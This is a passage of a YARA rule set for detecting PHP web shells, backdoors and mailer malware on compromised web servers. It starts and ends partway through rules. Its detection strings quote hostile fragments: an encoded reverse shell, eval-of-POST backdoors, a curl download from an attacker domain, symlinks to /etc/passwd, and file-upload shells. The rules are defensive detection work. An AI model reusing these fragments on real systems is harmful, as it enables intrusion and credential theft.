      $s16 = "DQWlQaVpUVDBOTFJWUWlLVHNOQ205d1pXNG9VMVJFUlZKU0xDQWlQaVpUVDBOTFJWUWlLVHNOQ25ONWMzUmxiU2duTDJKcGJpOXphQ0F0YVNjcE93MEtZMnh2YzJVb1U" ascii /* base64 encoded string 'AiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU' */
      $s17 = "pNDQudGlueXBpYy5jb20vMTE3NW5rai5naWYiIGlkPSJsb2dvIiBoZWlnaHQ9Ijc1JSIgd2lkdGg9IjkwJSIvPjwvZGl2PjxociBzdHlsZT0ibWFyZ2luOiAtNXB4IDE" ascii /* base64 encoded string '44.tinypic.com/1175nkj.gif" id="logo" height="75%" width="90%"/></div><hr style="margin: -5px 1' */
      $s18 = "JbnAiIHR5cGU9dGV4dCBuYW1lPWMgdmFsdWU9IicuaHRtbHNwZWNpYWxjaGFycygkR0xPQkFMU1snY3dkJ10pLiciPjxpbnB1dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iPj4" ascii /* base64 encoded string 'np" type=text name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"><input type=submit value=">>' */
      $s19 = "ocC5pbmlcJyxudWxsKSI+fCBQSFAuSU5JIHwgPC9hPjxhIGhyZWY9IyBvbmNsaWNrPSJnKG51bGwsbnVsbCxudWxsLFwnaW5pXCcpIj58IC5odGFjY2VzcyhNb2QpIHw" ascii /* base64 encoded string 'p.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) |' */
      $s20 = "5SUhCYk16QmRPdzBLSUNBZ0lITjBjblZqZENCemIyTnJZV1JrY2w5cGJpQnlPdzBLSUNBZ0lHUmhaVzF2YmlneExEQXBPdzBLSUNBZ0lITWdQU0J6YjJOclpYUW9RVVp" ascii /* base64 encoded string 'IHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZ' */
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 400KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-09-06
   Identifier: shell4
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_09_06_18_shell4_stats5 {
   meta:
      description = "shell4 - file stats5.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-09-06"
      hash1 = "8053c1ced5fe5f93dded31afdda01c9469be7bb025fdd2cd192903c4fccec40f"
   strings:
      $s1 = "ZXJyb3JfcmVwb3J0aW5nKDApOyBpZiAoaXNzZXQoJF9QT1NUWydjb29raWVzX2UnXSkpIHtldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUWydjb29raWVzX2UnXSkpO30g" /* base64 encoded string */
      $s2 = "@error_reporting(0); @eval(base64_decode(" ascii
      $s3 = "<?php" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-11-10
   Identifier: 11-10-18
   Reference: https://github.com/Hestat/lw-yara/
   Reference2: https://blog.sucuri.net/2018/11/erealitatea-net-hack-corrupts-websites-with-wp-gdpr-compliance-plugin-vulnerability.html
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_11_10_18_wp_cache {
   meta:
      description = "11-10-18 - file wp-cache.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-11-10"
      hash1 = "0cb269e10c1c0e315f07f3d7536472056f4b830a48dc739d02ff30454a1f5780"
   strings:
      $s1 = "Array('str_' .'rot13','pack','st' .'rrev'" fullword ascii
      $s2 = "php function _1178619035" fullword ascii
      $s3 = "return isset($_COOKIE" fullword ascii
      $s4 = "$GLOBALS['_79565595_']" fullword ascii  
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( 2 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-24
   Identifier: shell5
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_24_18_shell5_symlink_bypass {
   meta:
      description = "shell5 - file bypass.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-24"
      hash1 = "ab49973d4e68b5230e50bc76ec10bccfe3511476232c8ae1ffdc4f17abdfe77b"
   strings:
      $x1 = "@exec('curl http://turkblackhats.com/priv/ln.zip -o ln.zip');" fullword ascii
      $s5 = "@exec('./ln -s /etc/passwd 1.txt');" fullword ascii
      $s6 = "@exec('ln -s /etc/passwd 1.txt');" fullword ascii
      $s8 = "@exec('./ln -s /home/'.$user3.'/public_html ' . $user3);" fullword ascii
   condition:
      ( uint16(0) == 0x213c and
         filesize < 200KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule symlink_hacking_tool
{

    meta:
       author = "Brian Laskowski"
       info = " symlink hack tool 05-14-18 "

    strings:
    	
	$a= "$folfig"
	$b= "$str=explode"
	$c= "$home"
	$d= "$user"
	$e= "symlink"

    condition:
    all of them
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-11
   Identifier: status
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule tbl_status_webshell {
   meta:
      description = "status - file tbl_status.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-08-11"
      hash1 = "83135837a0f81a06a6713a385156255ebeb0f4067e98d142a12442279544e209"
   strings:
      $s1 = "$wp_nonce = isset($_POST['f_pp']) ? $_POST['f_pp'] : (isset($_COOKIE['f_pp']) ? $_COOKIE['f_pp'] : NULL);" fullword ascii
      $s2 = "$wp_kses_data = 'O7ZDrQwa6UbFoqfZpODFm%%EmMp9dJWPwTBXF8QYAZ5zK7zdrqsSuFfuD71elbShG+JYtYbXjbUhRMXhAl5DaK5OwyTJm+v3rdBQKiBBHMt0bnh" ascii
      $s3 = "if( isset($_POST['f_pp']) ) @setcookie( 'f_pp', $_POST['f_pp'] );" fullword ascii
      $s4 = "$ord = ord( $filter[$i] ) - ord( $wp_nonce[$i] );" fullword ascii
      $s5 = "66L+7GioDFcKxdMhnhYnoLRng+UxsCFlO98r3IetzfBMJo3ztZphbIBUljFTyw605eIAaFnH7sEbpGYngHHseI6i5AVr5ee8Be1UFAavxpy+JSPy5h1FrCxg6KR7Aqfs" ascii
      $s6 = "SAgqB81qiQJH5LLQ23wtzLuMliDYX7DXvYPj62C8H+4RyVGkd1kiqvDPnIGDtgx4xDd4X7s0YjQamEh+5DsPyiZDBBoU4lL5OEL4Kkwz52wY+S3dmOEOJzTTxlEzIxb5" ascii
      $s7 = "VA3qyv+8bXHlcVpGK9z3+J7ASAT4NR0xP6c9akHoyqLs96+YeihhzfMXGDd7UTQgpHWuRIElSxNOqlO1CLmdrdkSV1lq39JX2Jy7Jq8eHcQz7spYcnBco05x9Bm5SkKd" ascii
      $s8 = "function wp_admin_bar_header() { " fullword ascii
      $s9 = "$kses_str = str_replace( array ('%', '*'), array ('/', '='), $wp_kses_data );" fullword ascii
      $s10 = "wp_admin_bar_header();" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 70KB and
         ( all of them )
      ) or ( all of them )
}

rule infected_05_26_18_tekel {
   meta:
      description = "05-26-18 - file tekel.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-05-29"
      hash1 = "56ce193a3ce784d11ce95ca3f887dffc5bef65b634c6977628b2cafe97f6b2aa"
   strings:
      $s1 = "$OOO000000=urldecode('%66%67%36%73%62%65%68%70%72%61%34%63%6f%5f%74%6e%64');$OOO0000O0=$OOO000000{4}.$OOO000000{9}.$OOO000000{3}" ascii
      $s2 = "#solevisible@gmail.com" fullword ascii
      $s3 = "G/QGxJgggfQH9DUmpBTIBKN1M2TaFAVWldEABQTXWxoGleU05wVWo/NVM1awYEUGM1TXRAgOkAPm1WUmNqekB2UQQIUnA0SUJ8wH5zbFVBXUtATVVmAEBtRVVQamNzYk" ascii
      $s4 = "BAQSABalYFUFBAPkheNWNdUmpjMwoAAAJdUjRJclRrTURRQndUY8oAUEIQa5GQUmA2XUEAVTdzUROAcFZrQQMETGJsQW1TJIA+AH5Sbj5F0QBsVhQANzYzScFdswBWNT" ascii
      $s5 = "AAN0FSZn1sNVJRUWZdNzZBUAAAaUVRUEJVbF02UTNMNVVFXQEAbEE0TH1FdLRAbFJAQUFJX1EAAFJlN11DVEFRRFI0Y0llQmMAAEheN01PVW1GM1BBVn1VNVEgETJUfU" ascii
      $s6 = "9scVR9gABagGpRd1V9RU1MN1FoZUFNVAAISzRvaVVRUWpiQU4zJ0FRQmuEANZAb3VRayhAU0VMUVJocGNCPggETWNCVUbASUBmQl1AUlFPAGtJBIBvVFNON5bAQl6OIF" ascii
      $s7 = "fCwANAC8BTQUhWUlE3Y1BNThAiVWpzcUBdN1BqMzcBQE9WacEAbQQAUVddQlIMAE5+Y0BrbWM3TUtIglEFAEo3w0Bsf0i2gH5UbFFBF2BBoADqQDQLgEtdN2N9SUBjQl" ascii
      $s8 = "VOfUlQf0lVQe8Bd1Biak1BkAJCgVRBAIBDRWZKQVJ9Vl9vdwFTpSIOgDfVAEJVGgJjlwBjUEiQfklSm1BDAsBrcFNQc1WRgEI0QBwAYDJQQ0lsAAhmalZwZU93bEptUU" ascii
      $s9 = "NBSFJRRWlQUW8AAERKUE1yU2prTGJfY0lTT2sAYElVQkF3ZDddbNTAAgBjVGRqQQgETlJqa3nANkVIQmNMZjcLQGldAABvVjVJaVN9TjZmQFVfUGlBAABdZlBWcF1BY1" ascii
      $s10 = "VWfUFWTYBAAFFzFkBTgADFgEtefUFBSmtNaFNrRUFKQwAAb1JRT29IVEBJUVE3QUhibgAAPzZQQH9VVEJWfUlSf0RjNwIANldWUlV+eEA0VlNdMWJpTVZIAFMWAElpJo" ascii
      $s11 = "Y2VV5KX0FsSkNrvYBJaGUBkFBOcEhAPmo0AAQAY00VAHNlQjJYUEnCQDMHgKsANkJQaq8AahRBSWhQQCgETU56AFOjAFJda1Y2XWtF2QBJSoFA0gRBSzVWcFTaAEowwF" ascii
      $s12 = "JDSWMgPkvAgEtwQABAf0pBa09JQk1S/EBvVEJ3cF5AADTYQDU+X2ZSQUxjNT5xVn1FWABJc8BP+sDHAElWXlJdfmM3czVJIABQawgBMV1qb1ZKNU1fUG4/MoABRQBSSU" ascii
      $s13 = "NFZH1vQ2JpY0pVAABAczRWUj5VVX1Rc1NDb0RTAYFBbzFRbHdDIWCGQGNQVVFNckAAAIRuUFJJSVU0SUwAUV9IUFUwbHeYEMeAY0VfAGoASXZjN3NWNABrVVJdAMAzVE" ascii
      $s14 = "YzECBTQD7IgHNFXVNvROIAbVY3QW0AAEpANnNLfWtNVTUyTWZsb2gJAWNSd0KAgEtSEYBRUn90VF93SoAAAEFtXUAyTGRsb0tWbUlmZVICADZWSTZjSBgAX1ZRVjdQX0" ascii
      $s15 = "p/SGM1TVEDgElQUVJKaZvAzAEKAWxBbkprUn4AgV41f1BkNzZepABSSmp0f10SIEBAURQBa11TUTd3NYAAVFVRTU5QIoBsMoUAaHVeGQBQGAFrSVBlalVNQABdHgBdak" ascii
      $s16 = "o2d05JAQFrUn9jQwAATW5WUmNVUGxJS1ZQVVZSaiIAY2ziADFmNSFANlVmUlNdVmZqAQA2VWRfY2lJGoBUU0lpVEFCNAgiVmtWM44ARVBPd00JAHFdQDIBRQIEU159QU" ascii
      $s17 = "9VX1FBvABSGYBdUlJdXwIAVGpvbVRBZAB9bzJWbFFoVlIgGElVNAFVVD5RVm1VQw9AmuBRclMAAEFJbUs3dzJJQkEyXWledVVABFMEgE9jVWVPY0NlUlFNDQBBUQEFNl" ascii
      $s18 = "FJa2MyUW1vX2JSNjRWGAE3b2zfgDWAPk1Vam8yXUFjNwICQJBT78BDRjRUN2NBgEFJK0BBY1J3AABVXm1NTGRCVXZUUl03SmlVAgA2XlFjNGVxAFFqPk9lUU0zUAAQUG" ascii
      $s19 = "GToFZrAABRdlBrY2xKQGNAVlFSMmZswgIlAHMAZUJOcXAAaVZQVU9QagLAQAAAVUlSbF1QSlFvU1ZsQV5KaQKAY0NjN11RAQB0fgBsYzZ3RFBBIRBdRHLAX1BsUREAd2" ascii
      $s20 = "AMQFkAU1FCMgAAdFZRUXJlVD52UlFdRVFRQQBAMlJQf31dN1Y1DkBVVEI+XkkAgEFJQFY3QWpSwYBmakEyVlFNAIBzSEJNTlRPayFgPlRlUGB1XgKAUmA2UzRVrgFUDw" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 900KB and
         ( 8 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-08-21
   Identifier: shell
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_08_21_18_shell2_shell_test {
   meta:
      description = "shell - file test.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2018-08-21"
      hash1 = "f48a75ca4c418e39f0b1a81476a6a05c02c22d68a28f93eec503307adec81cf6"
   strings:
      $s1 = "print \"<b>send an report to [\".$_POST['email'].\"] - Order : $xx</b>\"; " fullword ascii
      $s2 = "mail($_POST['email'],\"Result Report Test - \".$xx,\"WORKING !\");" fullword ascii
      //$s3 = "er=\"Order ID\" name=\"orderid\" value=\"<?php print $_POST['orderid']?>\" ><br>" fullword ascii
      $s4 = "if (!empty($_POST['email'])){" fullword ascii
      $s5 = "$xx =$_POST['orderid'];" fullword ascii
      $s6 = "Upload is <b><color>WORKING</color></b><br>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-13
   Identifier: savoie
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule tndtttttttt {
   meta:
      description = "savoie - file tndtttttttt.png"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-13"
      hash1 = "a4a177bfb694405c740c9c41e42cd6e0942ae051187f55d60605e7577d736719"
   strings:
      $x1 = "<?php if(empty($_GET['ineedthispage'])){ini_set('display_errors',\"Off\");ignore_user_abort(1);$IHhrJldouNuxfU=\"10.1\";$Id8ZwPX" ascii
      $s2 = "file_get_contents(\"http://\".str_ireplace(\"getdata.php\",\"clientdata\",$I3LWl1M2tv1iF2));$Id8ZwPXWckPpnzl3s33=str_ireplace(ur" ascii
      $s3 = "($Id8ZwPXWckPpnzl3s13,CURLOPT_USERAGENT,$I3LWl1M2tv1iF3);$Id8ZwPXWckPpnzl3s81=curl_exec($Id8ZwPXWckPpnzl3s13);$Id8ZwPXWckPpnzl3s" ascii
      $s4 = "($Id8ZwPXWckPpnzl3s13,CURLOPT_USERAGENT,\"Mozilla/5.0 AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17\");" ascii
      $s5 = "ytics.com\")){$Id8ZwPXWckPpnzl3s21=str_ireplace($Id8ZwPXWckPpnzl3s23,\"\",$Id8ZwPXWckPpnzl3s21);}}}$Id8ZwPXWckPpnzl3s21=urldecod" ascii
      $s6 = "ZwPXWckPpnzl3s13,CURLOPT_RETURNTRANSFER,true);curl_setopt($Id8ZwPXWckPpnzl3s13,CURLOPT_REFERER,\"http://b9i9n9g.com\");curl_seto" ascii
      $s7 = "7[1]);$id=trim($Id8ZwPXWckPpnzl3s27[0]);$Id8ZwPXWckPpnzl3s21=file_get_contents(\"http://\".trim(implode(\"/\",$Id8ZwPXWckPpnzl3s" ascii
      $s8 = "history:</b> \".file_get_contents($IKPsVeprdGnwKN87);}die();}else{echo\"No errors\";}}}function IIk7AUspZQkcT($body){global $bod" ascii
      $s9 = "pnzl3s47,CURLOPT_POSTFIELDS,$Id8ZwPXWckPpnzl3s46);$Id8ZwPXWckPpnzl3s48=curl_exec($Id8ZwPXWckPpnzl3s47);curl_close($Id8ZwPXWckPpn" ascii
      $s10 = "=\\\"description\\\" CONTENT=\\\"\".trim($Id8ZwPXWckPpnzl3s55[1]).\"\\\"/>\\n</head>\",$Id8ZwPXWckPpnzl3s66);$Id8ZwPXWckPpnzl3s6" ascii
      $s11 = "YHOST,false);curl_setopt($Id8ZwPXWckPpnzl3s13,CURLOPT_CONNECTTIMEOUT,5);curl_setopt($Id8ZwPXWckPpnzl3s13,CURLOPT_USERAGENT,$I3LW" ascii
      $s12 = "11\",\"checktime111\",\"decodeservurl111\",\"getpagefmurl111\",\"cloack111\",\"poscheck111\",\"setime111\",\"codedata111\",\"cod" ascii
      $s13 = "\"decodedata111\",\"getbody111\",\"gettitle111\",\"getdesc111\",\"randString111\",\"palevodecode111\",\"getsettings111\",\"is_fu" ascii
      $s14 = "rl_exec($Id8ZwPXWckPpnzl3s13);$Id8ZwPXWckPpnzl3s15=\"\";$Id8ZwPXWckPpnzl3s15=curl_error($Id8ZwPXWckPpnzl3s13);if(!empty($Id8ZwPX" ascii
      $s15 = "\"/\").\"/index.php/?option=com_content&view=article&id=\".$id.\"&ineedthispage=yes\");$Id8ZwPXWckPpnzl3s21=str_ireplace(\"&inee" ascii
      $s16 = ".$IO08BMaMsqZRBS98.\"<br><b>Parsed Temp- </b>\".$Id8ZwPXWckPpnzl3s42;}$Id8ZwPXWckPpnzl3s43=urlencode(IIyxCWR1dOXjHmTCrnE($Id8ZwP" ascii
      $s17 = "ace(\"http://\",\"\",$I3LWl1M2tv1iF2);if(!empty($_SERVER['HTTP_USER_AGENT'])){$I3LWl1M2tv1iF3=$_SERVER['HTTP_USER_AGENT'];}else{" ascii
      $s18 = "2.\"<br><b>Themes-</b> \".$IO08BMaMsqZRBS95.\"<br><b>Extlinks-</b> \".$IO08BMaMsqZRBS98.\"<br><b>Parsed Temp- </b>\".$Id8ZwPXWck" ascii
      $s19 = "Ppnzl3s81=curl_exec($Id8ZwPXWckPpnzl3s13);$Id8ZwPXWckPpnzl3s15=curl_error($Id8ZwPXWckPpnzl3s13);if(!empty($Id8ZwPXWckPpnzl3s15))" ascii
      $s20 = "y($_SERVER['HTTP_X_FORWARDED_FOR'])){$I3LWl1M2tv1iF5=$_SERVER['HTTP_X_FORWARDED_FOR'];}elseif(!empty($_SERVER['REMOTE_ADDR'])){$" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 200KB and
         ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule infected_07_13_18_savoie_index {
   meta:
      description = "savoie - file index.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-13"
      hash1 = "4fa56221e38a08c4ad68878580d437d2bef8c0cc72d8173e019ade77301139f2"
   strings:
      $s1 = "$uploadfile = $_POST['path'].$_FILES['uploadfile']['name'];" fullword ascii
      $s2 = "if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $uploadfile))" fullword ascii
      $s3 = "fwrite($fp, $_POST['uploadfile']);" fullword ascii
      $s4 = "else {echo $_FILES['uploadfile']['error'];}" fullword ascii
      $s5 = "if ($_POST['upload']=='1'){" fullword ascii
      $s6 = "if (isset($_POST['upload'])){" fullword ascii
      $s7 = "if ($_POST['upload']=='2'){" fullword ascii
      $s8 = "$fp=fopen($_POST['path'],'a');  " fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

/* Super Rules ------------------------------------------------------------- */

/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-01-27
   Identifier: 01-27-19
   Reference: https://github.com/Hestat/lw-yara/
   Reference: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-6703
   Reference: https://www.wordfence.com/blog/2019/01/wordpress-sites-compromised-via-zero-day-vulnerabilities-in-total-donations-plugin/
*/

/* Rule Set ----------------------------------------------------------------- */

rule the_ajax_caller {
   meta:
      description = "01-27-19 - file the-ajax-caller.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-01-27"
      hash1 = "7574d791231f41ab64d3934efccc52e1e0396b63f7e3e3c046ba4e3ca0c1beda"
   strings:
      $s1 = "$action = esc_attr(trim($_POST['action']));" fullword ascii
      $s2 = "if(is_user_logged_in())" fullword ascii
      $s3 = "//For logged in users" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2019-01-13
   Identifier: 01-13-19
   Reference: https://github.com/Hestat/lw-yara/
*/

/* Rule Set ----------------------------------------------------------------- */

rule infected_01_13_19_cpanel_shell {
   meta:
      description = "01-13-19 - file cpanel.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara/"
      date = "2019-01-13"
      hash1 = "19cfd29f5f32e84d7c7271a5629badaf77b630ba57a0d1f7e13d83f0a562e4d1"
   strings:
      $x1 = "function ccmmdd($ccmmdd2,$att)" fullword ascii
      $s1 = "$code = fread($sahacker, filesize($pathclass" fullword ascii
      $s2 = "$code=@str_replace" ascii
      $s3 = "system - passthru - exec - shell_exec</strong></td>" fullword ascii
      $s4 = "$error = @ocierror(); $this->error=$error" fullword ascii
   condition:
      ( uint16(0) == 0x683c and
         filesize < 70KB and
         ( 1 of ($x*) and 1 of them )
      ) or ( all of them )
}
/*
   Yara Rule Set
   Author: Brian Laskowski
   Date: 2018-07-14
   Identifier: Tryag-File-Manager-jpeg-master
   Reference: https://github.com/Hestat/lw-yara
*/

/* Rule Set ----------------------------------------------------------------- */

rule Tryag_File_Manager_jpeg_master_0up {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file 0up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "083c429dc1ffeabbd474429b573c40d6f395b1765409fbb9e63c98f05c1fb80d"
   strings:
      $s1 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      //$s2 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }" fullword ascii
      //$s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      //$s4 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      //$s5 = "else { echo '<b>Not uploaded ! </b><br><br>'; }" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}


rule _media_brian_88D1_7DB91_infected_07_14_18_Tryag_File_Manager_jpeg_master_up {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file up.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "5bdaa9018e5892715d584d359f2d7eafd528137ec1ac403aafd56662e4bece05"
   strings:
      $s1 = "<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }" fullword ascii
      $s3 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s4 = "if( $_POST['_upl'] == \"Upload\" ) {" fullword ascii
      $s5 = "else { echo '<b>Not uploaded ! </b><br><br>'; }" fullword ascii
   condition:
      ( uint16(0) == 0x743c and
         filesize < 1KB and
         ( all of them )
      ) or ( all of them )
}

rule alexusMailer_v2_0 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file alexusMailer_v2.0.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "82572013074747e079cde069ab95af8b20b597aaf76eeb892dc383a58be24620"
   strings:
      $x1 = "</span><br>\"),$(\"#out_servers\").val($(\"#out_servers\").val()+b.server+\"\\n\")):$(\"#pingout_log\").html(c+\"<span style='co" ascii
      $x2 = "}b.merge(d,s.childNodes),s.textContent=\"\";while(s.firstChild)s.removeChild(s.firstChild);s=f.lastChild}else d.push(t.createTex" ascii
      $x3 = "*/(function(n){function vi(t){var i=this,e=t.target,y=n.data(e,a),p=s[y],w=p.popupName,k=f[w],v,b;if(!i.disabled&&n(e).attr(r)!=" ascii
      $x4 = "if(\"undefined\"==typeof jQuery)throw new Error(\"Bootstrap's JavaScript requires jQuery\");+function(a){\"use strict\";function" ascii
      $x5 = "return(!i||i!==r&&!b.contains(r,i))&&(e.type=o.origType,n=o.handler.apply(this,arguments),e.type=t),n}}}),b.support.submitBubble" ascii
      $x6 = "!function(a,b){\"use strict\";\"function\"==typeof define&&define.amd?define([\"jquery\"],b):\"object\"==typeof exports?module.e" ascii
      $x7 = "(function(e,t){var n,r,i=typeof t,o=e.document,a=e.location,s=e.jQuery,u=e.$,l={},c=[],p=\"1.9.1\",f=c.concat,d=c.push,h=c.slice" ascii
      $x8 = "body{background-color:#fff}.content{margin:0 auto;background-color:#fcf2d4;width:1000px;padding:5px;border:1px solid #000;border" ascii
      $x9 = ": http://serv4.ru/sw.php|c99|login:password<?php endif;?>\"  <?php if(SERVICEMODE):?>readonly<?php endif;?>></textarea><br>" fullword ascii
      $x10 = "\"error\"=>$translation->getWord(\"shell-sheck-test-command-execution-failed\")" fullword ascii
      $x11 = "'shell-sheck-test-command-execution-failed'=>'Test command execution failed'," fullword ascii
      $x12 = "On the Configuration tab of external servers is available quick check of shells, it checks that the addresses are correct, passw" ascii
      $x13 = "ach(function(){d.offsets.push(this[0]),d.targets.push(this[1])})},b.prototype.process=function(){var a,b=this.$scrollElement.scr" ascii
      $s14 = "\"echo file_get_contents(\\'http://google.com/humans.txt\\');\" " fullword ascii
      $s15 = "* Bootstrap v3.2.0 (http://getbootstrap.com)" fullword ascii
      $s16 = "'shell-sheck-test-command-execution-failed'=>'" fullword ascii
      $s17 = "* Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)" fullword ascii
      $s18 = "return $shellManager->exec($type, $url, $code, $data, $pass, isset($login)?$login:null);" fullword ascii
      $s19 = "$answer=$shellManager->exec($type, $url, $testcode, $data, $pass, isset($login)?$login:null);" fullword ascii
      $s20 = "command. Try using the keyboard shortcut or context menu instead.\",f):ut(n,l?l:\"Error executing the \"+i+\" command.\",f))}ret" ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 2000KB and
         ( 1 of ($x*) and all of them )
      ) or ( all of them )
}


rule TryagFileManager3 {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file TryagFileManager3.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
      date = "2018-07-14"
      hash1 = "3cf5af7774d1dc7ca7b58d9d6899ef307eabb9ed9b66d4ef0eb44cd346135bd8"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo('<pre>'.htmlspecialchars(file_get_contents(base64_decode($_GET['filesrc']))).'</pre>');" fullword ascii
      $s3 = "echo '<br />Tryag File Manager Version <font color=\"red\">1.1</font>, Coded By <font color=\"red\">./ChmoD</font><br />Home: <f" ascii
      $s4 = "<script type=\"text/javascript\" src=\"http://www.codejquery.net/jquery.mins.js\" ></script>" fullword ascii
      $s5 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s6 = "echo '<br />Tryag File Manager Version <font color=\"red\">1.1</font>, Coded By <font color=\"red\">./ChmoD</font><br />Home: <f" ascii
      $s7 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s8 = "echo '<font color=\"red\">File Upload Error.</font><br />';" fullword ascii
      $s9 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$pathen\\\">" fullword ascii
      $s10 = "$url=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];" fullword ascii
      $s11 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s12 = "echo '<font color=\"green\">File Upload Done.</font><br />';" fullword ascii
      $s13 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s14 = "foreach($_POST as $key=>$value){" fullword ascii
      $s15 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s16 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s17 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s18 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s19 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s20 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and
         filesize < 30KB and
         ( 8 of them )
      ) or ( all of them )
}

rule leafmailer {
   meta:
      description = "Tryag-File-Manager-jpeg-master - file leafmailer.php"
      author = "Brian Laskowski"
      reference = "https://github.com/Hestat/lw-yara"
